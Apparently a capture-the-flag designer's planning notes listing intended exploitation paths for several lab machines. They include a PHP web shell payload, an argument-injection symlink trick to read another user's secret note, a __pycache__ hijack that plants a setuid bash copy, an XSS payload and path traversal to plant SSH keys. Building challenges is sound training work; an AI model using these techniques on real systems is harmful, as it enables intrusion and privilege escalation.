FOOTHOLD:
    Create pet with name t.php
    Rename description to <?php system($_GET['x']); ?>
    Use /pets/t.php?x=whoami
    Get reverse shell
USER:
    Create temp dir
    touch '--files0-from'
    ln -s /home/james/secret-note.txt x
    sudo -u james /home/james/totalwc.sh
    Get password, change user using su
ROOT:
    We can rename __pycache__ and add our own one
    cp /bin/bash /tmp/x
    Replace the cat /proc/cpuinfo with the following
        cp /tmp/x /tmp/y
        chmod +s /tmp/y
    Then after getting root to run those commands, we can do
    /tmp/y -p
    To get a shell with euid root

    Can read hint.txt

randalpc

FOOTHOLD:
    Use XSS to get access to admin page. Use something like
    x' onfocus=alert(1) name='foo
    And then a url that has #foo
USER:
    Use path traversal in the dirname to upload authorized_key to .ssh
ROOT:
    TODO


tompc:

FOOTHOLD:
    Get password using CAPS lock XSS

USER:
    Use \ to escape the first quote, then use a payload to get rce from the second

ROOT:
    Read the source code of a discord bot
    Use a race condition + sqli with multiple discord users to access


startingpoint:

FOOTHOLD:
    I give a zip file to crack
    The zip file contains a png file of the internal network
    Credentials to join the foothold machine are there too


Loose ends:
    randalpc needs a root part, then you will have shell as root
    tompc gives you a flag.txt file

What I could do:
    Give a tiny slice of the password with each finale
    In startingpoint, once you get root, you are informed of a secret ssh machine which you can ssh to
